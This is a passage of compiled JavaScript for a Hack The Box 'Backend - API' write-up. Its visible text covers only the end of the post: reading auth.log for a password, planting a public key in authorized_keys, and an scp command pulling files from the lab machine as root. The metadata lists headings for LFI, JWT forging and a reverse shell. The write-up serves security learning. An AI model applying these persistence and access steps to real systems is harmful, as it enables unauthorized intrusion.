"),e("code",null,"stty"),i(" ： "),e("a",{href:"https://man7.org/linux/man-pages/man1/stty.1.html",target:"_blank",rel:"noreferrer"},"https://man7.org/linux/man-pages/man1/stty.1.html")],-1),Ti=e("p",null,[i("cn manual："),e("a",{href:"https://man.archlinux.org/man/stty.1.zh_TW",target:"_blank",rel:"noreferrer"},"https://man.archlinux.org/man/stty.1.zh_TW")],-1),Ui=e("h2",{id:"auth-log-scp",tabindex:"-1"},[i("auth.log& scp "),e("a",{class:"header-anchor",href:"#auth-log-scp","aria-label":'Permalink to "auth.log& scp"'},"​")],-1),Si=e("p",null,"find the password。。。",-1),Ii=e("p",null,"and you also can paste your public key to authroized_keys file,scp the file",-1),Di=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"scp"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -r"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -i"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," backend"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," root@10.10.11.161:/home/htb/uhc"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," .")])])]),e("button",{class:"collapse"})],-1),$i=e("p",null,": -r : recursive (because it is a folder)",-1),Li=e("p",null,[i("you can also tar all the file to "),e("code",null,"bz2")],-1),Ni={__name:"htbbackend-api",setup(Wi,{expose:d}){const l=JSON.parse('{"title":"[HTB]Backend - API","description":"","frontmatter":{"title":"[HTB]Backend - API","date":"2022-04-17T14:19:16.000Z","tags":["HTB","API","笔记"],"published":true,"hideInList":false,"feature":null,"isTop":false},"headers":[{"level":2,"title":"nmap","slug":"nmap","link":"#nmap","children":[]},{"level":2,"title":"gobuster","slug":"gobuster","link":"#gobuster","children":[]},{"level":2,"title":"Examing the endpoint","slug":"examing-the-endpoint","link":"#examing-the-endpoint","children":[]},{"level":2,"title":"API Discovery","slug":"api-discovery","link":"#api-discovery","children":[{"level":3,"title":"gobuster","slug":"gobuster-1","link":"#gobuster-1","children":[]},{"level":3,"title":"feroxbuster","slug":"feroxbuster","link":"#feroxbuster","children":[]},{"level":3,"title":"wfuzz","slug":"wfuzz","link":"#wfuzz","children":[]}]},{"level":2,"title":"Fuzzing signup","slug":"fuzzing-signup","link":"#fuzzing-signup","children":[]},{"level":2,"title":"Curl behaves&troubleshoot","slug":"curl-behaves-troubleshoot","link":"#curl-behaves-troubleshoot","children":[]},{"level":2,"title":"Attemping to login with our credential","slug":"attemping-to-login-with-our-credential","link":"#attemping-to-login-with-our-credential","children":[]},{"level":2,"title":"Accessing /docs endpoint","slug":"accessing-docs-endpoint","link":"#accessing-docs-endpoint","children":[]},{"level":2,"title":"Authenticating in the swagger","slug":"authenticating-in-the-swagger","link":"#authenticating-in-the-swagger","children":[]},{"level":2,"title":"Login in with admin and do something","slug":"login-in-with-admin-and-do-something","link":"#login-in-with-admin-and-do-something","children":[{"level":3,"title":"/api/v1/admin/file","slug":"api-v1-admin-file","link":"#api-v1-admin-file","children":[]},{"level":3,"title":"/api/v1/admin/exec/","slug":"api-v1-admin-exec","link":"#api-v1-admin-exec","children":[]}]},{"level":2,"title":"Exploring the /proc/self directory with the LFI","slug":"exploring-the-proc-self-directory-with-the-lfi","link":"#exploring-the-proc-self-directory-with-the-lfi","children":[{"level":3,"title":"/api/v1/admin/file","slug":"api-v1-admin-file-1","link":"#api-v1-admin-file-1","children":[]},{"level":3,"title":"**/proc/self/environ**","slug":"proc-self-environ","link":"#proc-self-environ","children":[]},{"level":3,"title":"get the .py source code","slug":"get-the-py-source-code","link":"#get-the-py-source-code","children":[]},{"level":3,"title":"Copy souce code to vim","slug":"copy-souce-code-to-vim","link":"#copy-souce-code-to-vim","children":[]},{"level":3,"title":"read main.py","slug":"read-main-py","link":"#read-main-py","children":[]},{"level":3,"title":"read app.core.config","slug":"read-app-core-config","link":"#read-app-core-config","children":[]},{"level":3,"title":"using JWT_SECRET to generate jwt","slug":"using-jwt-secret-to-generate-jwt","link":"#using-jwt-secret-to-generate-jwt","children":[]},{"level":3,"title":"set new jwt  to /api/v1/admin/exec/whoami","slug":"set-new-jwt-to-api-v1-admin-exec-whoami","link":"#set-new-jwt-to-api-v1-admin-exec-whoami","children":[]}]},{"level":2,"title":"bypass slash restrict in url","slug":"bypass-slash-restrict-in-url","link":"#bypass-slash-restrict-in-url","children":[]},{"level":2,"title":"getting a reverse shell","slug":"getting-a-reverse-shell","link":"#getting-a-reverse-shell","children":[]},{"level":2,"title":"auth.log& scp","slug":"auth-log-scp","link":"#auth-log-scp","children":[]}],"relativePath":"pages/posts/history/htbbackend-api.md","path":"/home/runner/work/1dayluo.github.io/1dayluo.github.io/pages/posts/history/htbbackend-api.md","lastUpdated":1714218709000}'),o=p(),n=l.frontmatter||{};return o.meta.frontmatter=Object.assign(o.meta.frontmatter||{},l.frontmatter||{}),h("pageData",l),h("valaxy:frontmatter",n),globalThis.$frontmatter=n,d({frontmatter:{title:"[HTB]Backend - API",date:"2022-04-17T14:19:16.000Z",tags:["HTB","API","笔记"],published:!0,hideInList:!1,feature:null,isTop:!1}}),(t,Hi)=>{const r=c;return u(),g(r,{frontmatter:k(n)},{"main-content-md":s(()=>[m,b,y,_,v,F,f,C,w,B,E,x,P,z,j,A,T,U,S,I,D,$,L,W,G,H,q,O,R,J,V,Z,N,X,M,Y,K,Q,ee,ie,se,te,ae,le,ne,oe,he,de,re,ce,pe,ue,ge,ke,me,be,ye,_e,ve,Fe,fe,Ce,we,Be,Ee,xe,Pe,ze,je,Ae,Te,Ue,Se,Ie,De,$e,Le,We,Ge,He,qe,Oe,Re,Je,Ve,Ze,Ne,Xe,Me,Ye,Ke,Qe,ei,ii,si,ti,ai,li,ni,oi,hi,di,ri,ci,pi,ui,gi,ki,mi,bi,yi,_i,vi,Fi,fi,Ci,wi,Bi,Ei,xi,Pi,zi,ji,Ai,Ti,Ui,Si,Ii,Di,$i,Li]),"main-header":s(()=>[a(t.$slots,"main-header")]),"main-header-after":s(()=>[a(t.$slots,"main-header-after")]),"main-nav":s(()=>[a(t.$slots,"main-nav")]),"main-content":s(()=>[a(t.$slots,"main-content")]),"main-content-after":s(()=>[a(t.$slots,"main-content-after")]),"main-nav-before":s(()=>[a(t.$slots,"main-nav-before")]),"main-nav-after":s(()=>[a(t.$slots,"main-nav-after")]),comment:s(()=>[a(t.$slots,"comment")]),footer:s(()=>[a(t.$slots,"footer")]),aside:s(()=>[a(t.$slots,"aside")]),"aside-custom":s(()=>[a(t.$slots,"aside-custom")]),default:s(()=>[a(t.$slots,"default")]),_:3},8,["frontmatter"])}}};export{Ni as default};
